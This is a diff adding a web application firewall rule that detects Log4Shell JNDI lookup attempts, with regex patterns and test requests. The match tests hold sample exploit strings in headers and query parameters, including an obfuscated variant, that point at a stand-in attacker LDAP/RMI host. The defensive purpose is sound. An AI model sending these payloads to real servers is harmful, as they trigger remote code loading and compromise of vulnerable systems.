@@ -1,0 +1,38 @@
+# Virtual patch (rules/README.md: 700000-799999), format rules/schema/rule.schema.json.
+rule:
+  id: 700001
+  name: Log4Shell JNDI lookup (CVE-2021-44228, CVE-2021-45046)
+  layer: managed
+  stage: request_body
+  match:
+    any:
+    - targets: [ { var: uri_raw }, { var: request_headers }, { var: request_body } ]
+      transforms: [ url_decode_uni, lowercase ]
+      multi_match: true
+      operator: { type: rx, value: '\$\{\s*jndi\s*:' }
+    - targets: [ { var: uri_raw }, { var: request_headers }, { var: request_body } ]
+      transforms: [ url_decode_uni, lowercase ]
+      multi_match: true
+      operator: { type: rx, value: '\$\{[^}]{0,40}\$\{(?:lower|upper|::-|env:|sys:|date:|base64:)' }
+  score: 100
+  severity: critical
+  metadata:
+    source: strata
+    license: Apache-2.0
+    attack_type: rce
+    accuracy: high
+    systems: [java, log4j]
+    tags: [cve-2021-44228, cve-2021-45046, virtual-patch]
+tests:
+  match:
+  - uri: /
+    headers: { Host: api.example.test, User-Agent: '${jndi:ldap://attacker.example.test/a}', Accept: '*/*' }
+  - uri: /search?q=%24%7Bjndi%3Armi%3A%2F%2Fattacker.example.test%2Fa%7D
+    headers: { Host: api.example.test, User-Agent: example-client/1.0, Accept: application/json }
+  - uri: /
+    headers: { Host: api.example.test, X-Api-Version: '${${lower:j}${lower:n}di:ldap://attacker.example.test/a}' }
+  no_match:
+  - uri: /search?q=price+%24100+jndi+guide
+    headers: { Host: api.example.test, User-Agent: example-client/1.0, Accept: application/json }
+  - uri: /v1/items
+    headers: { Host: api.example.test, User-Agent: example-client/1.0, Accept: application/json }
